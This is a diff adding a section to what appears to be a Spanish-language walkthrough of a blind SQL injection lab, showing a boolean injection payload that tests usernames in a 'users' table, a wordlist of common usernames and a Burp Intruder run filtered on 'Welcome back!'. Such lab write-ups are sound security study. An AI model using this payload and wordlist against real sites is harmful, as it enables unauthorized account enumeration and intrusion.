@@ -179,3 +179,44 @@ Filtramos por el mensaje de `Welcome back!`
 Columnas filtradas que tienen el mensaje de `Welcome back!`
 
 ![columnas]({{site.url}}/images/SQLi/sqli-11/columnas filtradas.png)
+
+## Averiguar nombre de usuarios en la BD
+
+Ya que tenemos el nombre de la tabla y sus campos vamos a listar el nombre de los usuarios
+
+```sql
+' AND EXISTS (SELECT 1 FROM users WHERE username = 'PAYLOAD')--
+```
+
+ Lista de nombre de usuarios mas comunes
+
+ ```
+admin
+administrator
+root
+user
+guest
+test
+superuser
+default
+manager
+support
+moderator
+developer
+operator
+owner
+sales
+marketing
+finance
+hr
+accounting
+itadmin
+ ```
+
+ Realizamos el ataque de intruder
+
+![Intruder 2]({{site.url}}/images/SQLi/sqli-11/Intruder 2.png)
+
+Filtramos los usuarios que tienen el mensaje de `Welcome back!` y esos son los que existen en la tabla.
+
+![Filtado 2]({{site.url}}/images/SQLi/sqli-11/filtrado2.png)
